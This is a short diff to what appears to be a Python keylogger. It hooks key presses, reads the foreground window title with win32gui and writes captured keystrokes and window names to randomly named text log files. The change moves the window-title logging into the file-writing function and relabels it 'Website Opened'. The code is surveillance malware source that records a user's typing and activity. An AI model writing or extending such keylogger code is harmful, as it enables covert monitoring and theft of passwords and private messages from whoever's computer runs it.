@@ -59,7 +59,6 @@ def on_press(key):
     new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
     if old_app == '':
         old_app = new_app
-        message += f'Program Opened: {new_app}\n\n'
     # check when the program has been changed before writing into the log file
     # i.e. the target program was closed
     elif new_app != old_app and old_app != '':
@@ -86,6 +85,9 @@ def write_file(keys, message):
     filename = str(random.randint(1000000, 9999999)) + '.txt'
     while path.exists(log_dir+filename):
         filename = str(random.randint(1000000, 9999999)) + '.txt'
+    
+    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    message += f'Website Opened: {new_app}\n\n'
     
     # write in the log file
     with open(log_dir+filename, "a") as f:
